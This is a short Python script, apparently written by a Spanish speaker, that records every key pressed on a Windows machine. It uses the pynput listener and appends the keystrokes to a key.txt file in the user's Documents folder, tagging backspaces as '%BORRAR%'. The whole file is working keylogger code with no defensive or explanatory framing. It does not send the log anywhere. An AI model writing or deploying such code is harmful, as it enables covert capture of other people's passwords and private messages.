from pynput.keyboard import Listener
import datetime
from time import sleep
from os import close
import os
u_s = os.environ['USERPROFILE']
usuario = u_s.replace("\\", "/")
def key_recorder(key):
     f = open(usuario+'/Documents/key.txt', 'a')
     key = str(key)
     if(key == 'Key.enter'):
          f.write("\n")
     elif(key=='Key.space'):
          f.write(' ')
     elif(key=='Key.backspace'):
         f.write('%BORRAR%')
     else:
       f.write(key.replace("'",""))
with Listener(on_press=key_recorder) as l:
        l.join()
